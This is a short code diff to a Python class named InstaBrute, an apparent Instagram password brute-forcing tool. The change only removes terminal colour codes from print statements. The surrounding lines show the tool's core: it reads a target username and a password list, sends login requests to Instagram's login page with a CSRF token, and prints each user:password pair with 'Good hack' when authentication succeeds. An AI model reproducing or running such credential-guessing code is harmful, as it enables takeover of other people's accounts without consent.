@@ -24,7 +24,7 @@ class InstaBrute(object):
         try:
             user = input('username : ')
             Combo = input('passList : ')
-            print('\n\033[1;31;40m----------------------------\033[1;32;40m')
+            print('\n----------------------------')
 
         except:
             print(' The tool was arrested exit ')
@@ -70,7 +70,7 @@ class InstaBrute(object):
                 "Referer": "https://www.instagram.com/accounts/login/",
                 "x-csrftoken": csrf
             })
-            print(f'{user}:{pwd}\n\n\033[1;31;40m----------------------------\033[1;32;40m')
+            print(f'{user}:{pwd}\n\n----------------------------')
 
             if 'authenticated": true' in r.text:
                 print(('' + user + ':' + pwd + ' --> Good hack '))
